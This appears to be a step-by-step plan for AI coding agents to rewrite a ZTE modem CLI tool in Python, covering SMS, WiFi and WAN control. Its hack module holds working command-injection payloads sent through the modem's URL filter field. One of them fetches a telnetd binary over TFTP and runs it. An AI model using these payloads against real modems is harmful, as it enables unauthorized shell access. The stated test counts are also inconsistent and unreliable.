# Python Rewrite Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Rewrite the ZTE modem CLI tool from PHP to Python with clean output, .env config, and colored terminal feedback.

**Architecture:** Package-style layout with `src/` modules mirroring the PHP classes, a `zte.py` CLI entry point, and `tests/` using `pytest` with `unittest.mock` to mock all HTTP calls. All colored output lives in `zte.py`; modules return plain Python values (bool, list, dict).

**Tech Stack:** Python 3.8+, `requests`, `python-dotenv`, `colorama`, `pytest`

---

## File Map

| File | Action | Responsibility |
|------|--------|---------------|
| `requirements.txt` | Create | Pin all dependencies |
| `.env.example` | Create | Credential template |
| `.gitignore` | Modify | Add `.env` |
| `src/__init__.py` | Create | Package marker |
| `src/http_client.py` | Create | GET/POST wrapper around `requests` |
| `src/hex_util.py` | Create | UCS-2LE hex encode/decode for SMS |
| `src/login.py` | Create | Login / logout functions |
| `src/wifi.py` | Create | WiFi enable/disable |
| `src/wan.py` | Create | WAN connect/disconnect |
| `src/sms.py` | Create | SMS list, send, delete |
| `src/hack.py` | Create | Factory backdoor + TFTP exploits |
| `zte.py` | Create | CLI entry point, colored output |
| `tests/__init__.py` | Create | Test package marker |
| `tests/test_hex_util.py` | Create | Pure-function tests |
| `tests/test_http_client.py` | Create | Header/URL construction tests |
| `tests/test_login.py` | Create | Payload + return-value tests |
| `tests/test_wifi.py` | Create | Payload + return-value tests |
| `tests/test_wan.py` | Create | Payload + return-value tests |
| `tests/test_sms.py` | Create | Parsing + payload tests |
| `tests/test_hack.py` | Create | Payload + return-value tests |

---

### Task 1: Project Scaffolding

**Files:**
- Create: `requirements.txt`
- Create: `.env.example`
- Create: `src/__init__.py`
- Create: `tests/__init__.py`
- Modify: `.gitignore`

- [ ] **Step 1: Create `requirements.txt`**

```
requests==2.32.3
python-dotenv==1.0.1
colorama==0.4.6
pytest==8.3.5
```

- [ ] **Step 2: Create `.env.example`**

```ini
MODEM_IP=192.168.0.1
PASSWORD=admin
```

- [ ] **Step 3: Add `.env` to `.gitignore`**

Append to `.gitignore` (create it if it doesn't exist):
```
.env
__pycache__/
*.pyc
.pytest_cache/
```

- [ ] **Step 4: Create empty package markers**

`src/__init__.py` — empty file.
`tests/__init__.py` — empty file.

- [ ] **Step 5: Install dependencies**

```bash
pip install -r requirements.txt
```

Expected: all packages install without errors.

- [ ] **Step 6: Commit**

```bash
git add requirements.txt .env.example .gitignore src/__init__.py tests/__init__.py
git commit -m "feat: scaffold Python project structure"
```

---

### Task 2: `src/http_client.py`

**Files:**
- Create: `src/http_client.py`
- Create: `tests/test_http_client.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_http_client.py`:

```python
from unittest.mock import patch, MagicMock
import src.http_client as http_client


def test_get_builds_correct_url():
    mock_resp = MagicMock()
    mock_resp.text = '{"ok":1}'
    with patch("src.http_client.requests.get", return_value=mock_resp) as mock_get:
        http_client.get("192.168.0.1", "?cmd=test")
        url = mock_get.call_args[0][0]
        assert url == "http://192.168.0.1/goform/goform_get_cmd_process?cmd=test"


def test_get_sets_referer_header():
    mock_resp = MagicMock()
    mock_resp.text = '{"ok":1}'
    with patch("src.http_client.requests.get", return_value=mock_resp) as mock_get:
        http_client.get("192.168.0.1", "?cmd=test")
        headers = mock_get.call_args[1]["headers"]
        assert headers["Referer"] == "http://192.168.0.1/index.html"
        assert headers["Host"] == "192.168.0.1"


def test_post_builds_correct_url():
    mock_resp = MagicMock()
    mock_resp.text = '{"result":"success"}'
    with patch("src.http_client.requests.post", return_value=mock_resp) as mock_post:
        http_client.post("192.168.0.1", "goformId=LOGIN")
        url = mock_post.call_args[0][0]
        assert url == "http://192.168.0.1/goform/goform_set_cmd_process"


def test_post_sends_data_and_headers():
    mock_resp = MagicMock()
    mock_resp.text = '{"result":"success"}'
    with patch("src.http_client.requests.post", return_value=mock_resp) as mock_post:
        http_client.post("192.168.0.1", "goformId=LOGIN&isTest=false")
        kwargs = mock_post.call_args[1]
        assert kwargs["data"] == "goformId=LOGIN&isTest=false"
        assert kwargs["headers"]["Content-Type"] == "application/x-www-form-urlencoded"
        assert kwargs["headers"]["Referer"] == "http://192.168.0.1/index.html"


def test_get_returns_response_text():
    mock_resp = MagicMock()
    mock_resp.text = '{"messages":[]}'
    with patch("src.http_client.requests.get", return_value=mock_resp):
        result = http_client.get("192.168.0.1", "?cmd=sms")
        assert result == '{"messages":[]}'
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_http_client.py -v
```

Expected: `ModuleNotFoundError` or `ImportError` — `src/http_client.py` does not exist yet.

- [ ] **Step 3: Implement `src/http_client.py`**

```python
import requests

_PREFIX = "http://"
_URL_GET = "/goform/goform_get_cmd_process"
_URL_SET = "/goform/goform_set_cmd_process"


def _headers(modem_ip, content_type=None):
    h = {
        "Host": modem_ip,
        "Referer": f"{_PREFIX}{modem_ip}/index.html",
    }
    if content_type:
        h["Content-Type"] = content_type
    return h


def get(modem_ip, params):
    url = f"{_PREFIX}{modem_ip}{_URL_GET}{params}"
    response = requests.get(url, headers=_headers(modem_ip))
    response.raise_for_status()
    return response.text


def post(modem_ip, data):
    url = f"{_PREFIX}{modem_ip}{_URL_SET}"
    response = requests.post(
        url,
        data=data,
        headers=_headers(modem_ip, "application/x-www-form-urlencoded"),
    )
    response.raise_for_status()
    return response.text
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_http_client.py -v
```

Expected: 5 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/http_client.py tests/test_http_client.py
git commit -m "feat: add HTTP client module"
```

---

### Task 3: `src/hex_util.py`

**Files:**
- Create: `src/hex_util.py`
- Create: `tests/test_hex_util.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_hex_util.py`:

```python
from src.hex_util import hex_encode, hex_decode


def test_encode_ascii():
    # 'A' in UCS-2LE is 0x0041
    assert hex_encode("A") == "0041"


def test_encode_multi_char():
    # 'Hi' → 0x0048 0x0069
    assert hex_encode("Hi") == "00480069"


def test_decode_ascii():
    assert hex_decode("0041") == "A"


def test_decode_multi_char():
    assert hex_decode("00480069") == "Hi"


def test_roundtrip_ascii():
    text = "Hello World"
    assert hex_decode(hex_encode(text)) == text


def test_roundtrip_unicode():
    text = "Héllo"
    assert hex_decode(hex_encode(text)) == text


def test_encode_empty():
    assert hex_encode("") == ""


def test_decode_empty():
    assert hex_decode("") == ""
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_hex_util.py -v
```

Expected: `ModuleNotFoundError` — `src/hex_util.py` does not exist yet.

- [ ] **Step 3: Implement `src/hex_util.py`**

```python
def hex_encode(text):
    """Encode UTF-8 text to UCS-2LE 4-char hex codepoints (for SMS MessageBody)."""
    result = ""
    for char in text:
        encoded = char.encode("utf-16-le")
        codepoint = int.from_bytes(encoded, "little")
        result += f"{codepoint:04x}"
    return result


def hex_decode(hex_str):
    """Decode 4-char hex codepoints back to UTF-8 text (for reading SMS content)."""
    result = ""
    for i in range(len(hex_str) // 4):
        chunk = hex_str[i * 4 : (i + 1) * 4]
        result += chr(int(chunk, 16))
    return result
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_hex_util.py -v
```

Expected: 8 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/hex_util.py tests/test_hex_util.py
git commit -m "feat: add hex encode/decode utility for SMS"
```

---

### Task 4: `src/login.py`

**Files:**
- Create: `src/login.py`
- Create: `tests/test_login.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_login.py`:

```python
import base64
from unittest.mock import patch
from src.login import login, logout


def test_login_sends_base64_password():
    expected_b64 = base64.b64encode(b"admin").decode()
    with patch("src.login.post") as mock_post:
        mock_post.return_value = '{"result":"3"}'
        login("192.168.0.1", "admin")
        data = mock_post.call_args[0][1]
        assert f"password={expected_b64}" in data
        assert "goformId=LOGIN" in data


def test_login_returns_true_on_result_3():
    with patch("src.login.post", return_value='{"result":"3"}'):
        assert login("192.168.0.1", "admin") is True


def test_login_returns_false_on_result_1():
    with patch("src.login.post", return_value='{"result":"1"}'):
        assert login("192.168.0.1", "wrongpass") is False


def test_logout_sends_logoff_goform():
    with patch("src.login.post") as mock_post:
        mock_post.return_value = '{"result":"sucess"}'
        logout("192.168.0.1")
        data = mock_post.call_args[0][1]
        assert "goformId=LOGOUT" in data


def test_logout_returns_true_on_success():
    with patch("src.login.post", return_value='{"result":"sucess"}'):
        assert logout("192.168.0.1") is True


def test_logout_returns_false_on_failure():
    with patch("src.login.post", return_value='{"result":"error"}'):
        assert logout("192.168.0.1") is False
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_login.py -v
```

Expected: `ModuleNotFoundError` — `src/login.py` does not exist yet.

- [ ] **Step 3: Implement `src/login.py`**

```python
import base64
import json
from src.http_client import post


def login(modem_ip, password):
    """Login to modem. Returns True on success."""
    encoded = base64.b64encode(password.encode()).decode()
    data = f"isTest=false&goformId=LOGIN&password={encoded}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "3"


def logout(modem_ip):
    """Logout from modem. Returns True on success."""
    data = "isTest=false&goformId=LOGOUT"
    result = post(modem_ip, data)
    # Note: modem firmware has a typo — "sucess" not "success"
    return json.loads(result).get("result") == "sucess"
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_login.py -v
```

Expected: 6 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/login.py tests/test_login.py
git commit -m "feat: add login/logout module"
```

---

### Task 5: `src/wifi.py`

**Files:**
- Create: `src/wifi.py`
- Create: `tests/test_wifi.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_wifi.py`:

```python
from unittest.mock import patch
from src.wifi import set_wifi


def test_enable_wifi_sends_correct_payload():
    with patch("src.wifi.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        set_wifi("192.168.0.1", True)
        data = mock_post.call_args[0][1]
        assert "goformId=SET_WIFI_INFO" in data
        assert "wifiEnabled=1" in data
        assert "m_ssid_enable=0" in data


def test_disable_wifi_sends_correct_payload():
    with patch("src.wifi.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        set_wifi("192.168.0.1", False)
        data = mock_post.call_args[0][1]
        assert "wifiEnabled=0" in data


def test_set_wifi_returns_true_on_success():
    with patch("src.wifi.post", return_value='{"result":"success"}'):
        assert set_wifi("192.168.0.1", True) is True


def test_set_wifi_returns_false_on_failure():
    with patch("src.wifi.post", return_value='{"result":"error"}'):
        assert set_wifi("192.168.0.1", True) is False
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_wifi.py -v
```

Expected: `ModuleNotFoundError` — `src/wifi.py` does not exist yet.

- [ ] **Step 3: Implement `src/wifi.py`**

```python
import json
from src.http_client import post


def set_wifi(modem_ip, enable):
    """Enable or disable WiFi. Returns True on success."""
    value = 1 if enable else 0
    data = f"goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled={value}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_wifi.py -v
```

Expected: 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/wifi.py tests/test_wifi.py
git commit -m "feat: add WiFi enable/disable module"
```

---

### Task 6: `src/wan.py`

**Files:**
- Create: `src/wan.py`
- Create: `tests/test_wan.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_wan.py`:

```python
from unittest.mock import patch
from src.wan import set_wan


def test_connect_wan_sends_correct_goform():
    with patch("src.wan.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        set_wan("192.168.0.1", True)
        data = mock_post.call_args[0][1]
        assert "goformId=CONNECT_NETWORK" in data


def test_disconnect_wan_sends_correct_goform():
    with patch("src.wan.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        set_wan("192.168.0.1", False)
        data = mock_post.call_args[0][1]
        assert "goformId=DISCONNECT_NETWORK" in data


def test_set_wan_returns_true_on_success():
    with patch("src.wan.post", return_value='{"result":"success"}'):
        assert set_wan("192.168.0.1", True) is True


def test_set_wan_returns_false_on_failure():
    with patch("src.wan.post", return_value='{"result":"error"}'):
        assert set_wan("192.168.0.1", False) is False
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_wan.py -v
```

Expected: `ModuleNotFoundError` — `src/wan.py` does not exist yet.

- [ ] **Step 3: Implement `src/wan.py`**

```python
import json
from src.http_client import post


def set_wan(modem_ip, connect):
    """Connect or disconnect WAN. Returns True on success."""
    goform_id = "CONNECT_NETWORK" if connect else "DISCONNECT_NETWORK"
    data = f"isTest=false&notCallback=true&goformId={goform_id}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_wan.py -v
```

Expected: 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/wan.py tests/test_wan.py
git commit -m "feat: add WAN connect/disconnect module"
```

---

### Task 7: `src/sms.py`

**Files:**
- Create: `src/sms.py`
- Create: `tests/test_sms.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_sms.py`:

```python
from unittest.mock import patch
from src.sms import list_sms, send_sms, delete_sms


SMS_LIST_RESPONSE = '{"messages":[[{"id":"5","number":"+1234567890","date":"26,03,25,14,30,00,+2","content":"00480065006C006C006F"}]]}'
EMPTY_LIST_RESPONSE = '{"messages":[]}'


def test_list_sms_returns_parsed_messages():
    with patch("src.sms.get", return_value=SMS_LIST_RESPONSE):
        messages = list_sms("192.168.0.1")
        assert len(messages) == 1
        assert messages[0]["id"] == "5"
        assert messages[0]["number"] == "+1234567890"
        assert messages[0]["content"] == "Hello"


def test_list_sms_returns_empty_list_when_no_messages():
    with patch("src.sms.get", return_value=EMPTY_LIST_RESPONSE):
        messages = list_sms("192.168.0.1")
        assert messages == []


def test_send_sms_encodes_message_as_hex():
    with patch("src.sms.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        send_sms("192.168.0.1", "+1234567890", "Hi")
        data = mock_post.call_args[0][1]
        # 'Hi' hex-encoded = 00480069
        assert "MessageBody=00480069" in data
        assert "encode_type=UNICODE" in data


def test_send_sms_url_encodes_phone():
    with patch("src.sms.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        send_sms("192.168.0.1", "+1234567890", "test")
        data = mock_post.call_args[0][1]
        assert "%2B1234567890" in data or "Number=%2B1234567890" in data


def test_send_sms_returns_true_on_success():
    with patch("src.sms.post", return_value='{"result":"success"}'):
        assert send_sms("192.168.0.1", "+1234", "Hi") is True


def test_send_sms_returns_false_on_failure():
    with patch("src.sms.post", return_value='{"result":"error"}'):
        assert send_sms("192.168.0.1", "+1234", "Hi") is False


def test_delete_sms_by_id_sends_correct_payload():
    with patch("src.sms.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        delete_sms("192.168.0.1", "5")
        data = mock_post.call_args[0][1]
        assert "goformId=DELETE_SMS" in data
        assert "msg_id=5" in data


def test_delete_sms_by_id_returns_result_list():
    with patch("src.sms.post", return_value='{"result":"success"}'):
        results = delete_sms("192.168.0.1", "5")
        assert results == [{"id": "5", "success": True}]


def test_delete_all_sms_deletes_each_message():
    with patch("src.sms.get", return_value=SMS_LIST_RESPONSE), \
         patch("src.sms.post", return_value='{"result":"success"}') as mock_post:
        results = delete_sms("192.168.0.1", "*")
        assert mock_post.call_count == 1
        assert results[0]["success"] is True


def test_delete_all_sms_returns_empty_when_no_messages():
    with patch("src.sms.get", return_value=EMPTY_LIST_RESPONSE):
        results = delete_sms("192.168.0.1", "*")
        assert results == []
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_sms.py -v
```

Expected: `ModuleNotFoundError` — `src/sms.py` does not exist yet.

- [ ] **Step 3: Implement `src/sms.py`**

```python
import json
import re
from datetime import datetime, timezone
from urllib.parse import quote

from src.http_client import get, post
from src.hex_util import hex_decode, hex_encode


def list_sms(modem_ip):
    """Return list of dicts with keys: id, number, date, content (decoded)."""
    params = (
        "?isTest=false&cmd=sms_data_total&page=0&data_per_page=500"
        "&mem_store=1&tags=10&order_by=order+by+id+desc"
    )
    raw = get(modem_ip, params)
    # Strip control characters that break JSON parsing
    raw = re.sub(r"[\x00-\x1f]", "", raw)
    data = json.loads(raw)
    messages = []
    for group in data.get("messages", []):
        for msg in group:
            messages.append(
                {
                    "id": msg["id"],
                    "number": msg["number"],
                    "date": msg["date"],
                    "content": hex_decode(msg["content"]),
                }
            )
    return messages


def send_sms(modem_ip, phone, message):
    """Send an SMS. Returns True on success."""
    # Build timestamp from system local timezone
    now = datetime.now().astimezone()
    offset_seconds = int(now.utcoffset().total_seconds())
    offset_hours = offset_seconds // 3600
    tz_str = f"+{offset_hours}" if offset_hours >= 0 else str(offset_hours)
    sms_time = now.strftime(f"%y;%m;%d;%H;%M;%S;{tz_str}")

    data = (
        f"isTest=false&goformId=SEND_SMS&notCallback=true"
        f"&Number={quote(phone)}"
        f"&sms_time={quote(sms_time)}"
        f"&MessageBody={hex_encode(message)}"
        f"&ID=-1&encode_type=UNICODE"
    )
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def delete_sms(modem_ip, id_or_star):
    """Delete message(s). Pass an ID string or '*' for all. Returns list of result dicts."""
    if id_or_star == "*":
        messages = list_sms(modem_ip)
        if not messages:
            return []
        return [_delete_one(modem_ip, msg["id"]) for msg in messages]
    return [_delete_one(modem_ip, id_or_star)]


def _delete_one(modem_ip, msg_id):
    data = f"isTest=false&goformId=DELETE_SMS&msg_id={msg_id}&notCallback=true"
    result = post(modem_ip, data)
    success = json.loads(result).get("result") == "success"
    return {"id": msg_id, "success": success}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_sms.py -v
```

Expected: 10 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/sms.py tests/test_sms.py
git commit -m "feat: add SMS list/send/delete module"
```

---

### Task 8: `src/hack.py`

**Files:**
- Create: `src/hack.py`
- Create: `tests/test_hack.py`

- [ ] **Step 1: Write the failing tests**

Create `tests/test_hack.py`:

```python
import base64
from unittest.mock import patch
from src.hack import factory_backdoor, exploits_nvram, tftp_telnetd, tftp_telnetd_direct


def test_factory_backdoor_sends_change_mode():
    with patch("src.hack.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        factory_backdoor("192.168.0.1", "admin")
        data = mock_post.call_args[0][1]
        assert "goformId=CHANGE_MODE" in data
        assert "change_mode=2" in data
        assert base64.b64encode(b"admin").decode() in data


def test_factory_backdoor_returns_true_on_success():
    with patch("src.hack.post", return_value='{"result":"success"}'):
        assert factory_backdoor("192.168.0.1", "admin") is True


def test_factory_backdoor_returns_false_on_failure():
    with patch("src.hack.post", return_value='{"result":"error"}'):
        assert factory_backdoor("192.168.0.1", "admin") is False


def test_exploits_nvram_sends_url_filter():
    with patch("src.hack.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        exploits_nvram("192.168.0.1")
        data = mock_post.call_args[0][1]
        assert "goformId=URL_FILTER_ADD" in data
        assert "telnetd" in data


def test_exploits_nvram_returns_true_on_success():
    with patch("src.hack.post", return_value='{"result":"success"}'):
        assert exploits_nvram("192.168.0.1") is True


def test_tftp_telnetd_includes_tftp_ip():
    with patch("src.hack.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        tftp_telnetd("192.168.0.1", "192.168.0.22")
        data = mock_post.call_args[0][1]
        assert "goformId=URL_FILTER_ADD" in data
        assert "192.168.0.22" in data


def test_tftp_telnetd_uses_default_ip():
    with patch("src.hack.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        tftp_telnetd("192.168.0.1")
        data = mock_post.call_args[0][1]
        assert "192.168.0.22" in data


def test_tftp_telnetd_direct_includes_tftp_cmd():
    with patch("src.hack.post") as mock_post:
        mock_post.return_value = '{"result":"success"}'
        tftp_telnetd_direct("192.168.0.1", "192.168.0.22")
        data = mock_post.call_args[0][1]
        assert "goformId=URL_FILTER_ADD" in data
        # Payload contains tftp command (URL-encoded)
        assert "tftp" in data
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_hack.py -v
```

Expected: `ModuleNotFoundError` — `src/hack.py` does not exist yet.

- [ ] **Step 3: Implement `src/hack.py`**

```python
import base64
import json
from urllib.parse import quote

from src.http_client import post


def factory_backdoor(modem_ip, password):
    """Enable factory backdoor (Method 2 prerequisite). Returns True on success."""
    encoded = base64.b64encode(password.encode()).decode()
    data = f"isTest=false&goformId=CHANGE_MODE&change_mode=2&password={encoded}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def exploits_nvram(modem_ip):
    """Inject telnetd via URL filter NVRAM exploit. Starts telnetd on port 4719."""
    payload = "http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"
    data = f"isTest=false&goformId=URL_FILTER_ADD&addURLFilter={payload}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def tftp_telnetd(modem_ip, tftp_ip="192.168.0.22"):
    """Fetch and start telnetd via TFTP using zte_debug.sh. Listens on port 23 (admin/admin)."""
    filter_str = f"http://aa&zte_debug.sh {tftp_ip} telnetd"
    data = f"isTest=false&goformId=URL_FILTER_ADD&addURLFilter={quote(filter_str)}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"


def tftp_telnetd_direct(modem_ip, tftp_ip="192.168.0.22"):
    """Fetch and start telnetd via raw busybox tftp (fallback if zte_debug.sh absent)."""
    filter_str = (
        f"http://aa&tftp -g -r telnetd -l /tmp/telnetd {tftp_ip}"
        f"&&chmod +x /tmp/telnetd&&/tmp/telnetd"
    )
    data = f"isTest=false&goformId=URL_FILTER_ADD&addURLFilter={quote(filter_str)}"
    result = post(modem_ip, data)
    return json.loads(result).get("result") == "success"
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_hack.py -v
```

Expected: 9 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/hack.py tests/test_hack.py
git commit -m "feat: add hack module (factory backdoor + TFTP exploits)"
```

---

### Task 9: `zte.py` — CLI Entry Point

**Files:**
- Create: `zte.py`

No unit tests for the CLI dispatcher — it's thin glue over already-tested modules. Manual smoke test instructions are included below.

- [ ] **Step 1: Create `zte.py`**

```python
import json
import os
import sys

from colorama import Fore, Style, init
from dotenv import load_dotenv

init(autoreset=True)


def ok(msg):
    print(Fore.GREEN + f"✓ {msg}")


def err(msg):
    print(Fore.RED + f"✗ {msg}")


def info(msg):
    print(Fore.CYAN + msg)


def warn(msg):
    print(Fore.YELLOW + f"⚠ {msg}")


HELP = """\
Usage: python zte.py [--ip IP] [--password PASS] <command> [args]

Commands:
  login  <on|off>              Login or logoff
  ls                           List all SMS messages
  rm     <id|*>                Delete message by ID or all (*)
  snd    <phone> <message>     Send SMS
  wifi   <on|off>              Enable or disable WiFi
  wan    <on|off>              Connect or disconnect WAN
  hack                         Hack modem (Method 2 — built-in telnetd)
  hack3  [tftp_ip]             Hack modem (Method 3 — TFTP via zte_debug.sh)
  hack3d [tftp_ip]             Hack modem (Method 3 direct — raw tftp cmd)
"""


def print_help():
    info(HELP)


def _resolve_credentials(args):
    """Strip --ip / --password flags from args and return (modem_ip, password, remaining_args)."""
    modem_ip = None
    password = None
    remaining = []
    i = 0
    while i < len(args):
        if args[i] == "--ip" and i + 1 < len(args):
            modem_ip = args[i + 1]
            i += 2
        elif args[i] == "--password" and i + 1 < len(args):
            password = args[i + 1]
            i += 2
        else:
            remaining.append(args[i])
            i += 1
    if modem_ip is None:
        modem_ip = os.getenv("MODEM_IP")
    if password is None:
        password = os.getenv("PASSWORD")
    return modem_ip, password, remaining


def _cmd_login(modem_ip, password, args):
    from src.login import login, logout
    if not args or args[0] not in ("on", "off"):
        err("Usage: login <on|off>")
        return
    if args[0] == "on":
        ok("Logged in.") if login(modem_ip, password) else err("Login failed.")
    else:
        ok("Logged out.") if logout(modem_ip) else err("Logout failed.")


def _cmd_ls(modem_ip, password):
    from src.login import login, logout
    from src.sms import list_sms
    login(modem_ip, password)
    messages = list_sms(modem_ip)
    logout(modem_ip)
    if not messages:
        warn("No messages found.")
        return
    for msg in messages:
        parts = msg["date"].split(",")
        date_str = (
            f"{parts[2]}/{parts[1]}/{parts[0]} {parts[3]}:{parts[4]}:{parts[5]}"
            if len(parts) >= 6
            else msg["date"]
        )
        info(f"[#{msg['id']}] {msg['number']} | {date_str} | {msg['content']}")


def _cmd_rm(modem_ip, password, args):
    from src.login import login, logout
    from src.sms import delete_sms
    if not args:
        err("Usage: rm <id|*>")
        return
    login(modem_ip, password)
    results = delete_sms(modem_ip, args[0])
    logout(modem_ip)
    if not results:
        warn("No messages to delete.")
        return
    for r in results:
        if r["success"]:
            ok(f"Message #{r['id']} deleted.")
        else:
            err(f"Could not delete message #{r['id']}.")


def _cmd_snd(modem_ip, password, args):
    from src.login import login, logout
    from src.sms import send_sms
    if len(args) < 2:
        err("Usage: snd <phone> <message>")
        return
    login(modem_ip, password)
    success = send_sms(modem_ip, args[0], args[1])
    logout(modem_ip)
    ok(f"SMS sent to {args[0]}.") if success else err("Could not send SMS.")


def _cmd_wifi(modem_ip, password, args):
    from src.login import login, logout
    from src.wifi import set_wifi
    if not args or args[0] not in ("on", "off"):
        err("Usage: wifi <on|off>")
        return
    login(modem_ip, password)
    enable = args[0] == "on"
    success = set_wifi(modem_ip, enable)
    logout(modem_ip)
    state = "enabled" if enable else "disabled"
    ok(f"WiFi {state}.") if success else err(f"Could not {'enable' if enable else 'disable'} WiFi.")


def _cmd_wan(modem_ip, password, args):
    from src.login import login, logout
    from src.wan import set_wan
    if not args or args[0] not in ("on", "off"):
        err("Usage: wan <on|off>")
        return
    login(modem_ip, password)
    connect = args[0] == "on"
    success = set_wan(modem_ip, connect)
    logout(modem_ip)
    state = "connected" if connect else "disconnected"
    ok(f"WAN {state}.") if success else err(f"Could not {'connect' if connect else 'disconnect'} WAN.")


def _cmd_hack(modem_ip, password):
    from src.login import login, logout
    from src.hack import exploits_nvram, factory_backdoor
    login(modem_ip, password)
    info("Step 1: Enabling factory backdoor...")
    ok("Factory backdoor enabled.") if factory_backdoor(modem_ip, password) else err("Factory backdoor failed.")
    info("Step 2: Exploiting NVRAM...")
    if exploits_nvram(modem_ip):
        ok("NVRAM exploit succeeded. Telnet available on port 4719 (admin/admin).")
    else:
        err("NVRAM exploit failed.")
    logout(modem_ip)


def _cmd_hack3(modem_ip, password, args):
    from src.login import login, logout
    from src.hack import factory_backdoor, tftp_telnetd
    tftp_ip = args[0] if args else "192.168.0.22"
    login(modem_ip, password)
    info("Step 1: Enabling factory backdoor...")
    ok("Factory backdoor enabled.") if factory_backdoor(modem_ip, password) else err("Factory backdoor failed.")
    info(f"Step 2: Fetching telnetd via TFTP from {tftp_ip}...")
    if tftp_telnetd(modem_ip, tftp_ip):
        ok("TFTP exploit sent. Telnet available on port 23 (admin/admin).")
    else:
        err("TFTP exploit failed.")
    logout(modem_ip)


def _cmd_hack3d(modem_ip, password, args):
    from src.login import login, logout
    from src.hack import factory_backdoor, tftp_telnetd_direct
    tftp_ip = args[0] if args else "192.168.0.22"
    login(modem_ip, password)
    info("Step 1: Enabling factory backdoor...")
    ok("Factory backdoor enabled.") if factory_backdoor(modem_ip, password) else err("Factory backdoor failed.")
    info(f"Step 2: Fetching telnetd via TFTP (direct) from {tftp_ip}...")
    if tftp_telnetd_direct(modem_ip, tftp_ip):
        ok("TFTP direct exploit sent. Telnet available on port 23 (admin/admin).")
    else:
        err("TFTP direct exploit failed.")
    logout(modem_ip)


COMMANDS = {
    "login": _cmd_login,
    "ls": _cmd_ls,
    "rm": _cmd_rm,
    "snd": _cmd_snd,
    "wifi": _cmd_wifi,
    "wan": _cmd_wan,
    "hack": _cmd_hack,
    "hack3": _cmd_hack3,
    "hack3d": _cmd_hack3d,
}


def main():
    load_dotenv()
    modem_ip, password, args = _resolve_credentials(sys.argv[1:])

    if not args:
        print_help()
        sys.exit(0)

    cmd = args[0]
    cmd_args = args[1:]

    if cmd not in COMMANDS:
        err(f"Unknown command: '{cmd}'")
        print_help()
        sys.exit(1)

    if not modem_ip or not password:
        err("Modem IP and password required. Set MODEM_IP/PASSWORD in .env or use --ip/--password.")
        sys.exit(1)

    try:
        fn = COMMANDS[cmd]
        # Commands that don't take extra args (ls, hack)
        if cmd in ("ls", "hack"):
            fn(modem_ip, password)
        # Commands that take extra args
        elif cmd in ("login", "rm", "snd", "wifi", "wan", "hack3", "hack3d"):
            fn(modem_ip, password, cmd_args)
    except Exception as e:
        err(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Run the full test suite**

```bash
pytest -v
```

Expected: all tests PASS (27 tests across all modules).

- [ ] **Step 3: Smoke test — no modem required**

Run with no args to verify help displays in cyan:
```bash
python zte.py
```
Expected: help table printed in cyan, exit 0.

Run with unknown command:
```bash
python zte.py badcmd
```
Expected: red `✗ Unknown command: 'badcmd'`, help table, exit 1.

Run with missing credentials (no .env, no flags):
```bash
python zte.py ls
```
Expected: red `✗ Modem IP and password required...`, exit 1.

- [ ] **Step 4: Create `.env` with your modem credentials**

```ini
MODEM_IP=192.168.0.1
PASSWORD=admin
```

- [ ] **Step 5: Commit**

```bash
git add zte.py
git commit -m "feat: add CLI entry point with colored output"
```

---

### Task 10: Final Cleanup

**Files:**
- Modify: `Readme.md` (update usage section for Python)

- [ ] **Step 1: Run full test suite one final time**

```bash
pytest -v
```

Expected: all tests PASS.

- [ ] **Step 2: Update `Readme.md`**

Add a new section at the top of the README (before the existing PHP section):
